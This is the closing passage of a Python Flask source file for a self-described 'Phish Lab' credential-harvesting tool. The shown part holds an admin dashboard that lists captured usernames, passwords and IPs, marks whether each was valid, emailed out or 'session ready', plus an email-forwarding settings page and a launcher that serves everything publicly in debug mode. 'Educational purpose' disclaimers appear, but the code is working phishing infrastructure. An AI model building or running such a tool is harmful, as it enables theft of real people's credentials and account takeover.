            background: #111;
            color: #fff;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
        }}
        .header {{
            background: linear-gradient(45deg, #f09433, #bc1888);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 30px;
        }}
        .stats {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }}
        .stat-box {{
            background: #222;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
        }}
        .stat-box h3 {{
            color: #0ff;
            margin: 0 0 10px 0;
        }}
        .stat-number {{
            font-size: 32px;
            font-weight: bold;
            color: #0f0;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }}
        th, td {{
            border: 1px solid #333;
            padding: 10px;
            text-align: left;
        }}
        th {{
            background: #222;
            color: #0ff;
        }}
        .success {{ color: #0f0; }}
        .failed {{ color: #f00; }}
        .checking {{ color: #ff0; }}
        .nav {{
            margin: 20px 0;
        }}
        .nav a {{
            color: #0ff;
            text-decoration: none;
            padding: 10px 20px;
            border: 1px solid #0ff;
            border-radius: 5px;
            margin-right: 10px;
        }}
        .nav a:hover {{
            background: #0ff;
            color: #000;
        }}
        .email-status {{ text-align: center; }}
        code {{
            background: #333;
            padding: 2px 5px;
            border-radius: 3px;
        }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🎣 Phish Lab Dashboard</h1>
        <p>Educational Tool for Cybersecurity Awareness</p>
    </div>
    
    <div class="nav">
        <a href="/">← Phishing Page</a>
        <a href="/admin/logout">Logout 🔐</a>
    </div>
    
    <div class="stats">
        <div class="stat-box">
            <h3>Total Captures</h3>
            <div class="stat-number">{total}</div>
        </div>
        <div class="stat-box">
            <h3>Valid Credentials</h3>
            <div class="stat-number">{valid}</div>
        </div>
        <div class="stat-box">
            <h3>Invalid Credentials</h3>
            <div class="stat-number">{total - valid}</div>
        </div>
        <div class="stat-box">
            <h3>Email Status</h3>
            <div class="stat-number">{"✅ ON" if EMAIL_ENABLED else "❌ OFF"}</div>
        </div>
    </div>
    
    <h2>📋 Recent Captures (Last 50)</h2>
    <table>
        <tr>
            <th>ID</th>
            <th>Time</th>
            <th>Username</th>
            <th>Password</th>
            <th>IP</th>
            <th>Status</th>
            <th>Emailed</th>
            <th>Session Ready</th>
        </tr>
        {rows_html}
    </table>
    
    <div style="margin-top: 30px; padding: 20px; background: #222; border-radius: 5px;">
        <h3>⚠️ Educational Purpose Notice</h3>
        <p>This tool is for educational purposes only. Use only with explicit permission on test accounts.</p>
        <p><strong>Email Configuration:</strong> {EMAIL_USER if EMAIL_ENABLED else "Disabled"}</p>
        <p><strong>Target Email:</strong> {TARGET_EMAIL if EMAIL_ENABLED else "N/A"}</p>
    </div>
</body>
</html>'''

# ⚙️ SETTINGS PAGE (Optional - for email configuration)
@app.route('/admin/settings')
@require_admin
def settings_page():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT key, value FROM settings")
    settings = {row[0]: row[1] for row in c.fetchall()}
    conn.close()
    
    return f'''
<!DOCTYPE html>
<html>
<head>
    <title>⚙️ Settings</title>
    <style>
        body {{ background: #111; color: #fff; font-family: monospace; padding: 20px; }}
        .settings-box {{ background: #222; padding: 20px; border-radius: 10px; max-width: 500px; }}
        input {{ width: 100%; padding: 10px; margin: 10px 0; background: #333; color: #fff; border: 1px solid #666; }}
        button {{ background: #0ff; color: #000; border: none; padding: 10px 20px; cursor: pointer; }}
        .nav a {{ color: #0ff; text-decoration: none; margin-right: 20px; }}
    </style>
</head>
<body>
    <div class="nav">
        <a href="/data_captured">← Back to Dashboard</a>
    </div>
    
    <h2>⚙️ Email Settings</h2>
    <div class="settings-box">
        <p><strong>Current Status:</strong> {"✅ Enabled" if EMAIL_ENABLED else "❌ Disabled"}</p>
        <p><strong>Sender:</strong> {EMAIL_USER}</p>
        <p><strong>Recipient:</strong> {TARGET_EMAIL}</p>
        <p style="color: #ff0; margin-top: 20px;">
            Note: To change email settings, modify the EMAIL_USER, EMAIL_PASS, 
            and TARGET_EMAIL variables in the code or set environment variables.
        </p>
    </div>
</body>
</html>'''

if __name__ == '__main__':
    print("\n" + "="*60)
    print("🔥 PHISH LAB DEMO - COMPLETE EDUCATIONAL TOOL")
    print("="*60)
    print("🌐 Phishing Page: http://127.0.0.1:5000")
    print("🔐 Admin Login: http://127.0.0.1:5000/admin")
    print("📊 Dashboard: http://127.0.0.1:5000/data_captured")
    print("📧 Email Status:", "✅ ENABLED" if EMAIL_ENABLED else "❌ DISABLED")
    if EMAIL_ENABLED:
        print(f"   Sender: {EMAIL_USER}")
        print(f"   Recipient: {TARGET_EMAIL}")
    print("💾 Database:", DB_FILE)
    print("="*60)
    print("⚠️  WARNING: FOR EDUCATIONAL PURPOSES ONLY")
    print("    Use only with demo/test accounts and proper authorization")
    print("="*60 + "\n")
    
    app.run(host='0.0.0.0', port=5000, debug=True)